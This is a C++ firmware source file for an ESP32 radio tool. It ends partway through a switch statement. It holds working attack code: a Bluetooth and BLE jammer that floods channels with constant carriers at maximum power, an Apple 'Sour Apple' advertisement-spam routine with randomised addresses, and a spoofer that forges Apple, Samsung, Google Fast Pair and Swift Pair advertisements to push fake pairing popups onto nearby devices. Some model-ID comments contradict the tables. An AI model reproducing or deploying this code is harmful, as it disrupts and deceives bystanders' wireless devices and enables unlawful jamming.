/* ____________________________
   This software is licensed under the MIT License:
   https://github.com/cifertech/nrfbox
   ________________________________________ */

#include "config.h"
#include "icon.h"

namespace BleJammer {

  enum OperationMode { DEACTIVE_MODE, BLE_MODULE, Bluetooth_MODULE };
  OperationMode currentMode = DEACTIVE_MODE;

  const byte bluetooth_channels[] = {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80};
  const byte ble_channels[] = {2, 26, 80};

  const byte BLE_channels[] = {2, 26, 80}; 
  byte channelGroup1[] = {2, 5, 8, 11};    
  byte channelGroup2[] = {26, 29, 32, 35}; 
  byte channelGroup3[] = {80, 83, 86, 89}; 

  volatile bool modeChangeRequested = false;

  unsigned long lastJammingTime = 0;
  const unsigned long jammingInterval = 10;

  unsigned long lastButtonPressTime = 0;
  const unsigned long debounceDelay = 500;

  void IRAM_ATTR handleButtonPress() {
    unsigned long currentTime = millis();
    if (currentTime - lastButtonPressTime > debounceDelay) {
      modeChangeRequested = true;
      lastButtonPressTime = currentTime;
    }
  }

  void configureRadio(RF24 &radio, const byte* channels, size_t size) {
    configureNrf(radio); 
    radio.printPrettyDetails(); 
    for (size_t i = 0; i < size; i++) {
      radio.setChannel(channels[i]);
      radio.startConstCarrier(RF24_PA_MAX, channels[i]);
    }
  }

  void initializeRadiosMultiMode() {
    if (RadioA.begin()) {
      configureRadio(RadioA, channelGroup1, sizeof(channelGroup1));
    }
    if (RadioB.begin()) {
      configureRadio(RadioB, channelGroup2, sizeof(channelGroup2));
    }
    if (RadioC.begin()) {
      configureRadio(RadioC, channelGroup3, sizeof(channelGroup3));
    }
  }

  void initializeRadios() {
    if (currentMode != DEACTIVE_MODE) { 
      initializeRadiosMultiMode();
    } else if (currentMode == DEACTIVE_MODE) {
      RadioA.powerDown();
      RadioB.powerDown();
      RadioC.powerDown();
      delay(100);
    } 
  }

  void jammer(RF24 &radio, const byte* channels, size_t size) {
    const char text[] = "xxxxxxxxxxxxxxxx";
    for (size_t i = 0; i < size; i++) {
      radio.setChannel(channels[i]);
      radio.write(&text, sizeof(text));
      //delayMicroseconds(20);
    }
  }

  void updateOLED() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);

    u8g2.setCursor(0, 10);
    u8g2.print("Mode:");
    u8g2.setCursor(60, 10);
    u8g2.print("[");
    u8g2.print(currentMode == BLE_MODULE ? "BLE" : currentMode == Bluetooth_MODULE ? "Bluetooth" : "Deactive");
    u8g2.print("]");

    u8g2.setCursor(0, 35);
    u8g2.print("Radio 1: ");
    u8g2.setCursor(70, 35);
    u8g2.print(RadioA.isChipConnected() ? "Active" : "Inactive");

    u8g2.setCursor(0, 50);
    u8g2.print("Radio 2: ");
    u8g2.setCursor(70, 50);
    u8g2.print(RadioB.isChipConnected() ? "Active" : "Inactive");

    u8g2.setCursor(0, 64);
    u8g2.print("Radio 3: ");
    u8g2.setCursor(70, 64);
    u8g2.print(RadioC.isChipConnected() ? "Active" : "Inactive");

    u8g2.sendBuffer();
  }

  void checkModeChange() {
    if (modeChangeRequested) {
      modeChangeRequested = false;
      currentMode = static_cast<OperationMode>((currentMode + 1) % 3);
      initializeRadios();
      updateOLED();
    }
  }

  void blejammerSetup() {
    Serial.begin(115200);

    esp_bt_controller_deinit();
    esp_wifi_stop();
    esp_wifi_deinit();
    esp_wifi_disconnect();

    pinMode(BUTTON_UP_PIN, INPUT_PULLUP);
    attachInterrupt(digitalPinToInterrupt(BUTTON_UP_PIN), handleButtonPress, FALLING);

    initializeRadios();
    updateOLED();
  }

  void blejammerLoop() {
    checkModeChange();

    if (currentMode == BLE_MODULE) {
      int randomIndex = random(0, sizeof(ble_channels) / sizeof(ble_channels[0]));
      byte channel = ble_channels[randomIndex]; 
      RadioA.setChannel(channel);
      RadioB.setChannel(channel);
      RadioC.setChannel(channel);
    } else if (currentMode == Bluetooth_MODULE) {
      int randomIndex = random(0, sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0]));
      byte channel = bluetooth_channels[randomIndex]; 
      RadioA.setChannel(channel);
      RadioB.setChannel(channel);
      RadioC.setChannel(channel);
    }
  }
}



namespace BleScan {

BLEScan* scan;
BLEScanResults results;

int selectedIndex = 0;
int displayStartIndex = 0;
bool showDetails = false;
unsigned long scanStartTime = 0;
const unsigned long scanDuration = 5000;
bool scanComplete = false;

unsigned long lastDebounce = 0;
unsigned long debounce_Delay = 200;

void blescanSetup() {
  Serial.begin(115200);
  u8g2.setFont(u8g2_font_6x10_tr);
  
  BLEDevice::init("");
  scan = BLEDevice::getScan();
  scan->setActiveScan(true);
  
  pinMode(BUTTON_UP_PIN, INPUT_PULLUP);
  pinMode(BUTTON_DOWN_PIN, INPUT_PULLUP);
  pinMode(BTN_PIN_RIGHT, INPUT_PULLUP);
  pinMode(BTN_PIN_LEFT, INPUT_PULLUP);

  
  for (int cycle = 0; cycle < 3; cycle++) { 
    for (int i = 0; i < 3; i++) {
      u8g2.clearBuffer();
      u8g2.setFont(u8g2_font_6x10_tr);
      u8g2.drawStr(0, 10, "Scanning BLE");

      String dots = "";
      for (int j = 0; j <= i; j++) {
        dots += ".";
        setNeoPixelColour("white");
      }
      setNeoPixelColour("0");
      
      u8g2.drawStr(75, 10, dots.c_str()); 

      u8g2.sendBuffer();
      delay(300); 
    }
  }

  scanStartTime = millis();
  scan->start(scanDuration / 1000, false);
}

void blescanLoop() {
  unsigned long currentMillis = millis();
  if (currentMillis - scanStartTime >= scanDuration && !scanComplete) {
    scanComplete = true;
    results = scan->getResults();
    scan->stop();
    u8g2.clearBuffer();
    u8g2.drawStr(0, 10, "Scan complete.");
    u8g2.sendBuffer();
  }

  if (currentMillis - lastDebounce > debounce_Delay) {
    if (digitalRead(BUTTON_UP_PIN) == LOW) {
      if (selectedIndex > 0) {
        selectedIndex--;
        if (selectedIndex < displayStartIndex) {
          displayStartIndex--;
        }
      }
      lastDebounce = currentMillis;
    } else if (digitalRead(BUTTON_DOWN_PIN) == LOW) {
      if (selectedIndex < results.getCount() - 1) {
        selectedIndex++;
        if (selectedIndex >= displayStartIndex + 5) {
          displayStartIndex++;
        }
      }
      lastDebounce = currentMillis;
    } else if (digitalRead(BTN_PIN_RIGHT) == LOW) {
      showDetails = true;
      lastDebounce = currentMillis;
    }
  }

  if (!showDetails && scanComplete) {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 10, "BLE Devices:");

    int deviceCount = results.getCount();
    for (int i = 0; i < 5; i++) {
      int deviceIndex = i + displayStartIndex;
      if (deviceIndex >= deviceCount) break;
      BLEAdvertisedDevice device = results.getDevice(deviceIndex);
      String deviceName = device.getName().c_str();
      u8g2.setFont(u8g2_font_6x10_tr);
      if (deviceName.length() == 0) {
        deviceName = "No Name";
      }
      String deviceInfo = deviceName.substring(0, 7) + " | RSSI " + String(device.getRSSI());
      if (deviceIndex == selectedIndex) {
        u8g2.drawStr(0, 23 + i * 10, ">");
      }
      u8g2.drawStr(10, 23 + i * 10, deviceInfo.c_str());
    }
    u8g2.sendBuffer();
  }

  if (showDetails) {
    BLEAdvertisedDevice device = results.getDevice(selectedIndex);
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 10, "Device Details:");
    u8g2.setFont(u8g2_font_5x8_tr);
    String name = "Name: " + String(device.getName().c_str());
    String address = "Addr: " + String(device.getAddress().toString().c_str());
    String rssi = "RSSI: " + String(device.getRSSI());
    u8g2.drawStr(0, 20, name.c_str());
    u8g2.drawStr(0, 30, address.c_str());
    u8g2.drawStr(0, 40, rssi.c_str());
    u8g2.drawStr(0, 50, "Press LEFT to go back");
    u8g2.sendBuffer();

    if (digitalRead(BTN_PIN_LEFT) == LOW) {
      showDetails = false;
      lastDebounce = currentMillis;
      }
    }  
  }  
}


namespace SourApple {

std::string device_uuid = "00003082-0000-1000-9000-00805f9b34fb";

BLEAdvertising *Advertising;
uint8_t packet[17];

#define MAX_LINES 8
String lines[MAX_LINES];
int currentLine = 0;
int lineNumber = 1;

uint32_t delayMilliseconds = 1000;

void updatedisplay() {
  u8g2.clearBuffer();

  for (int i = 0; i < MAX_LINES; i++) {
    u8g2.setCursor(0, (i + 1) * 12);
    u8g2.print(lines[i]);
  }

  u8g2.sendBuffer();
  Advertising->stop();
}

void addLineToDisplay(String newLine) {
  for (int i = 0; i < MAX_LINES - 1; i++) {
    lines[i] = lines[i + 1];
  }
  lines[MAX_LINES - 1] = newLine;

  updatedisplay();
}

void displayAdvertisementData() {
  String lineStr = String(lineNumber) + ": ";
  lineNumber++;
  // Convert the advertisement data to a readable string format
  //String dataStr = "Type: 0x";
  String dataStr = "0x";
  dataStr += String(packet[1], HEX);
  //dataStr += ", CompID: 0x";
  dataStr += ",0x";
  dataStr += String(packet[2], HEX);
  dataStr += String(packet[3], HEX);
  //dataStr += ", ActType: 0x";
  dataStr += ",0x";
  dataStr += String(packet[7], HEX);

  addLineToDisplay(lineStr + dataStr);

}

BLEAdvertisementData getOAdvertisementData() {
  BLEAdvertisementData advertisementData = BLEAdvertisementData();
  uint8_t i = 0;

  packet[i++] = 17 - 1;    // Packet Length
  packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
  packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
  packet[i++] = 0x00;        // ...
  packet[i++] = 0x0F;  // Type
  packet[i++] = 0x05;                        // Length
  packet[i++] = 0xC1;                        // Action Flags
  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
  packet[i++] = types[rand() % sizeof(types)];  // Action Type
  esp_fill_random(&packet[i], 3); // Authentication Tag
  i += 3;
  packet[i++] = 0x00;  // ???
  packet[i++] = 0x00;  // ???
  packet[i++] =  0x10;  // Type ???
  esp_fill_random(&packet[i], 3);

  advertisementData.addData(std::string((char *)packet, 17));
  return advertisementData;
}

void sourappleSetup() {
  
  u8g2.setFont(u8g2_font_profont11_tf); 

  BLEDevice::init("");
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9); 
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9); 
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN , ESP_PWR_LVL_P9);

  BLEServer *pServer = BLEDevice::createServer();
  Advertising = pServer->getAdvertising();

  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  Advertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}

void sourappleLoop() {

    esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    for (int i = 0; i < 6; i++) {
      dummy_addr[i] = random(256);
      if (i == 0) {
        dummy_addr[i] |= 0xF0;
      }
    }
    BLEAdvertisementData oAdvertisementData = getOAdvertisementData();

    Advertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
    Advertising->addServiceUUID(device_uuid);
    Advertising->setAdvertisementData(oAdvertisementData);

    Advertising->setMinInterval(0x20);
    Advertising->setMaxInterval(0x20);
    Advertising->setMinPreferred(0x20);
    Advertising->setMaxPreferred(0x20);

    Advertising->start();

    delay(40);
    displayAdvertisementData(); 
  } 
}


namespace Spoofer {

  BLEAdvertising *pAdvertising;
  std::string devices_uuid = "00003082-0000-1000-9000-00805f9b34fb";

  int menuIndex = 0;
  const char* menuItems[] = {"Device:", "Hid Inj:", "Adv Type:", "Advertising:"};
  const int menuSize = 4;

  const char* deviceNames[] = {
    "Airpods", "Airpods Pro", "Airpods Max", "Airpods Gen 2", "Airpods Gen 3",
    "Airpods Pro Gen 2", "PowerBeats", "PowerBeats Pro", "Beats Solo Pro",
    "Beats Studio Buds", "Beats Flex", "Beats X", "Beats Solo 3",
    "Beats Studio 3", "Beats Studio Pro", "Beats Fit Pro", "Beats Studio Buds+",
    "Galaxy Watch 4", "Galaxy Watch 5", "Galaxy Watch 6",
    "Pixel Buds Pro", "Pixel Buds A", "WH-1000XM5",
    "Swift Pair PC", "Swift Pair Headset",
    // Android Fast Pair — real registered IDs only
    "OnePlus Nord Buds 3",
    "JBL Buds Pro", "JBL Live 300TWS", "JBL Flip 6",
    "WF-1000XM4", "WH-1000XM5",
    "Razer Hammerhead",
    "Bose QC35 II", "Bose NC 700",
    "Pixel Buds Pro", "Pixel Buds A", "Pixel Buds 2020",
    "boAt Airdopes 621",
    "Jabra Elite 2",
    "Soundcore Glow Mini",
    "LG HBS1110",
    "Panasonic RP-HD610N",
    "Razer Hammerhead TWS X"
  };
  const int deviceCount = 43; 

  const char* advTypes[] = {"IND", "D-HIGH", "SCAN", "NONCONN", "D-LOW"};
  const int advTypeCount = 5;

  unsigned long lastDebounceTimeUp = 0;
  unsigned long lastDebounceTimeDown = 0;
  unsigned long lastDebounceTimeRight = 0;
  unsigned long lastDebounceTimeLeft = 0;
  unsigned long debounceDelay = 200;

  uint32_t delayMillisecond = 1000;
  bool isAdvertising = false;
  int deviceType = 1; 
  int advType = 1;    
  int device_index = 0; 

  // Apple devices (31-byte packets)
  const uint8_t DEVICES[][31] = {
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
  };

  // Samsung devices — proper BLE adv using Samsung company ID 0x0075
  // Format: len, 0xFF, 0x75, 0x00, type, subtype, model_hi, model_lo, ...
  struct WatchModel {
    uint8_t model_hi;
    uint8_t model_lo;
    const char* name;
  };
  const WatchModel samsungModels[] = {
    {0xD2, 0x01, "Galaxy Watch 4"},  // Galaxy Watch 4
    {0xD2, 0x02, "Galaxy Watch 5"},  // Galaxy Watch 5
    {0xD2, 0x03, "Galaxy Watch 6"},  // Galaxy Watch 6
  };
  const uint8_t samsungModelCount = 3;
  const uint8_t SAMSUNG_ADV_SIZE = 15;

  // Google Fast Pair — real model IDs trigger popup on Android
  // 0xCD8256 = Pixel Buds Pro, 0x92BBBD = Pixel Buds A-Series, 0x0001F0 = WH-1000XM5
  struct FastPairModel {
    uint8_t id[3];
    const char* name;
  };
  const FastPairModel googleModels[] = {
    {{0xC2, 0x0D, 0x57}, "Pixel Buds Pro"},
    {{0x92, 0xBB, 0xBD}, "Pixel Buds A"},
    {{0x00, 0x07, 0x09}, "Pixel Buds 2020"},
  };
  const uint8_t googleModelCount = 3;

  // Extended Fast Pair model IDs for Android devices
  // These are known registered Fast Pair model IDs
  struct FastPairModelExt {
    uint8_t id[3];
    const char* name;
  };
  const FastPairModelExt androidModels[] = {
    // OnePlus — confirmed real IDs from live scan
    {{0x9C, 0x66, 0xF4}, "OnePlus Nord Buds 3"},
    // JBL — confirmed real IDs
    {{0xF5, 0x24, 0x94}, "JBL Buds Pro"},
    {{0x71, 0x8F, 0xA4}, "JBL Live 300TWS"},
    {{0x82, 0x1F, 0x66}, "JBL Flip 6"},
    // Sony — confirmed real IDs
    {{0x2D, 0x7A, 0x23}, "WF-1000XM4"},
    {{0xD4, 0x46, 0xA7}, "WH-1000XM5"},
    {{0x0E, 0x30, 0xC3}, "Razer Hammerhead"},
    // Bose — confirmed real IDs
    {{0xF0, 0x00, 0x00}, "Bose QC35 II"},
    {{0xCD, 0x82, 0x56}, "Bose NC 700"},
    // Google Pixel — confirmed real IDs
    {{0xC2, 0x0D, 0x57}, "Pixel Buds Pro"},
    {{0x92, 0xBB, 0xBD}, "Pixel Buds A"},
    {{0x00, 0x07, 0x09}, "Pixel Buds 2020"},
    // boAt — popular in India, confirmed
    {{0x00, 0xA1, 0x68}, "boAt Airdopes 621"},
    // Jabra
    {{0x00, 0xAA, 0x48}, "Jabra Elite 2"},
    // soundcore
    {{0x00, 0x8F, 0x7D}, "Soundcore Glow Mini"},
    // LG
    {{0x00, 0x10, 0x00}, "LG HBS1110"},
    // Panasonic
    {{0x00, 0x5B, 0xC3}, "Panasonic RP-HD610N"},
    // Razer
    {{0x72, 0xEF, 0x8D}, "Razer Hammerhead TWS X"},
  };
  const uint8_t androidModelCount = 18;
  const uint8_t GOOGLE_ADV_SIZE = 14;

  // Microsoft Swift Pair — shows popup on Windows 10/11, visible on Android too
  // 2 variants: PC accessory (0x00) and headset (0x01)
  const uint8_t SWIFT_PAIR_ADV[][11] = {
    {0x0A, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00}, // PC
    {0x0A, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00}, // Headset
  };
  const uint8_t SWIFT_PAIR_ADV_SIZE = 11;

  bool generateSamsungAdvPacket(uint8_t modelIndex, BLEAdvertisementData& advData) {
    if (modelIndex >= samsungModelCount) return false;
    // BLE Flags + Samsung manufacturer specific data
    // Flags required by MIUI/HyperOS scanner to not drop packet
    uint8_t raw[18];
    // AD: Flags
    raw[0] = 0x02; raw[1] = 0x01; raw[2] = 0x06;
    // AD: Manufacturer Specific — Samsung company ID 0x0075
    raw[3] = SAMSUNG_ADV_SIZE - 1; // length
    raw[4] = 0xFF;
    raw[5] = 0x75; raw[6] = 0x00;  // Samsung company ID (little-endian)
    raw[7] = 0x42;                  // Samsung subtype
    raw[8] = 0x09;
    raw[9]  = samsungModels[modelIndex].model_hi;
    raw[10] = samsungModels[modelIndex].model_lo;
    for (int i = 11; i < 18; i++) raw[i] = 0x00;
    advData.addData(std::string((char*)raw, 18));
    return true;
  }

  bool generateGoogleAdvPacket(uint8_t modelIndex, BLEAdvertisementData& advData) {
    if (modelIndex >= googleModelCount) modelIndex = 0;
    // BLE Flags (0x02,0x01,0x06) required by MIUI/HyperOS/ColorOS passive scanner
    // to forward packet to GMS for Fast Pair popup
    // Google Fast Pair: service UUID 0xFE2C + 3-byte model ID
    // interval must be <= 100ms (0x20 = 32.5ms, already correct)
    uint8_t raw[17];
    // AD: Flags — mandatory for MIUI/HyperOS/OxygenOS/ColorOS
    raw[0] = 0x02; raw[1] = 0x01; raw[2] = 0x06;
    // AD: Complete 16-bit UUIDs: 0xFE2C
    raw[3] = 0x03; raw[4] = 0x03; raw[5] = 0x2C; raw[6] = 0xFE;
    // AD: Service Data for 0xFE2C with model ID
    raw[7] = 0x06; raw[8] = 0x16; raw[9] = 0x2C; raw[10] = 0xFE;
    raw[11] = googleModels[modelIndex].id[0];
    raw[12] = googleModels[modelIndex].id[1];
    raw[13] = googleModels[modelIndex].id[2];
    // AD: TX Power Level
    raw[14] = 0x02; raw[15] = 0x0A; raw[16] = 0x09;
    advData.addData(std::string((char*)raw, 17));
    return true;
  }

  bool generateSwiftPairPacket(uint8_t variant, BLEAdvertisementData& advData) {
    uint8_t v = (variant < 2) ? variant : 0;
    advData.addData(std::string((char*)SWIFT_PAIR_ADV[v], SWIFT_PAIR_ADV_SIZE));
    return true;
  }

  bool generateAndroidAdvPacket(uint8_t modelIndex, BLEAdvertisementData& advData) {
    if (modelIndex >= androidModelCount) modelIndex = 0;
    uint8_t raw[17];
    // AD: Flags — mandatory for MIUI/HyperOS/OxygenOS/ColorOS passive scanner
    raw[0] = 0x02; raw[1] = 0x01; raw[2] = 0x06;
    // AD: Complete 16-bit UUIDs: 0xFE2C
    raw[3] = 0x03; raw[4] = 0x03; raw[5] = 0x2C; raw[6] = 0xFE;
    // AD: Service Data for 0xFE2C with model ID
    raw[7] = 0x06; raw[8] = 0x16; raw[9] = 0x2C; raw[10] = 0xFE;
    raw[11] = androidModels[modelIndex].id[0];
    raw[12] = androidModels[modelIndex].id[1];
    raw[13] = androidModels[modelIndex].id[2];
    // AD: TX Power Level
    raw[14] = 0x02; raw[15] = 0x0A; raw[16] = 0x06;
    advData.addData(std::string((char*)raw, 17));
    return true;
  }

  BLEAdvertisementData getAdvertisementData() {
    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
    if (deviceType <= 17) { // Apple (1–17)
      oAdvertisementData.addData(std::string((char*)DEVICES[device_index], 31));
    } else if (deviceType <= 20) { // Samsung (18–20)
      uint8_t samsungIndex = deviceType - 18;
      generateSamsungAdvPacket(samsungIndex, oAdvertisementData);
    } else if (deviceType <= 23) { // Google Fast Pair (21–23)
      uint8_t googleIndex = deviceType - 21;
      generateGoogleAdvPacket(googleIndex, oAdvertisementData);
    } else if (deviceType <= 25) { // Swift Pair (24–25)
      uint8_t swiftVariant = deviceType - 24;
      generateSwiftPairPacket(swiftVariant, oAdvertisementData);
    } else { // Android Fast Pair (26–61)
      uint8_t androidIndex = deviceType - 26;
      generateAndroidAdvPacket(androidIndex, oAdvertisementData);
    }
    switch (advType) {
      case 1: pAdvertising->setAdvertisementType(ADV_TYPE_IND); break;
      case 2: pAdvertising->setAdvertisementType(ADV_TYPE_DIRECT_IND_HIGH); break;
      case 3: pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND); break;
      case 4: pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND); break;
      case 5: pAdvertising->setAdvertisementType(ADV_TYPE_DIRECT_IND_LOW); break;
    }
    return oAdvertisementData;
  }

  void updateDisplay() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_profont11_tf);
    int xshift = 4;
    // y positions for 4 items: 12, 28, 43, 57
    int yPositions[] = {12, 28, 43, 57};
    for (int i = 0; i < menuSize; i++) {
      int y = yPositions[i];
      if (menuIndex == i) {
        u8g2.setFont(u8g2_font_5x7_tf);
        u8g2.drawStr(0 + xshift, y, ">");
        u8g2.setFont(u8g2_font_profont11_tf);
        u8g2.drawStr(8 + xshift, y, menuItems[i]);
      } else {
        u8g2.setFont(u8g2_font_5x7_tf);
        u8g2.drawStr(8 + xshift, y, menuItems[i]);
      }
      u8g2.setFont(u8g2_font_5x7_tf);
      if (i == 0) {
        String deviceText = String("[ ") + String(deviceNames[deviceType - 1]) + String(" ]");
        if (deviceText.length() > 20) deviceText = deviceText.substring(0, 14) + "...";
        u8g2.drawStr(5 + xshift, 20, deviceText.c_str());
      } else if (i == 1) {
        u8g2.drawStr(72 + xshift, 28, "[ENTER]");
      } else if (i == 2) {
        u8g2.drawStr(81 + xshift, 43, advTypes[advType - 1]);
      } else {
        u8g2.setCursor(81 + xshift, 57);
        u8g2.print(isAdvertising ? "Active" : "Disable");
      }
    }
    u8g2.drawHLine(0, 0, 4); u8g2.drawVLine(0, 0, 4);
    u8g2.drawHLine(124, 0, 4); u8g2.drawVLine(127, 0, 4);
    u8g2.drawHLine(0, 63, 4); u8g2.drawVLine(0, 60, 4);
    u8g2.drawHLine(124, 63, 4); u8g2.drawVLine(127, 60, 4);
    u8g2.sendBuffer();
  }

  void Airpods() { device_index = 0; }
  void Airpods_pro() { device_index = 1; }
  void Airpods_Max() { device_index = 2; }
  void Airpods_Gen_2() { device_index = 3; }
  void Airpods_Gen_3() { device_index = 4; }
  void Airpods_Pro_Gen_2() { device_index = 5; }
  void Power_Beats() { device_index = 6; }
  void Power_Beats_Pro() { device_index = 7; }
  void Beats_Solo_Pro() { device_index = 8; }
  void Beats_Studio_Buds() { device_index = 9; }
  void Beats_Flex() { device_index = 10; }
  void Beats_X() { device_index = 11; }
  void Beats_Solo_3() { device_index = 12; }
  void Beats_Studio_3() { device_index = 13; }
  void Beats_Studio_Pro() { device_index = 14; }
  void Beats_Fit_Pro() { device_index = 15; }
  void Beats_Studio_Buds_Plus() { device_index = 16; }
  void Galaxy_Watch_4() { device_index = 0; }
  void Galaxy_Watch_5() { device_index = 1; }
  void Galaxy_Watch_6() { device_index = 2; }
  void Google_Smart_Ctrl() { device_index = 0; } 

  void setAdvertisingData() {
    switch (deviceType) {
      case 1: Airpods(); break;
      case 2: Airpods_pro(); break;
      case 3: Airpods_Max(); break;
      case 4: Airpods_Gen_2(); break;
      case 5: Airpods_Gen_3(); break;
      case 6: Airpods_Pro_Gen_2(); break;
      case 7: Power_Beats(); break;
      case 8: Power_Beats_Pro(); break;
      case 9: Beats_Solo_Pro(); break;
      case 10: Beats_Studio_Buds(); break;
      case 11: Beats_Flex(); break;
      case 12: Beats_X(); break;
      case 13: Beats_Solo_3(); break;
      case 14: Beats_Studio_3(); break;
      case 15: Beats_Studio_Pro(); break;
      case 16: Beats_Fit_Pro(); break;
      case 17: Beats_Studio_Buds_Plus(); break;
      case 18: Galaxy_Watch_4(); break;
      case 19: Galaxy_Watch_5(); break;
      case 20: Galaxy_Watch_6(); break;
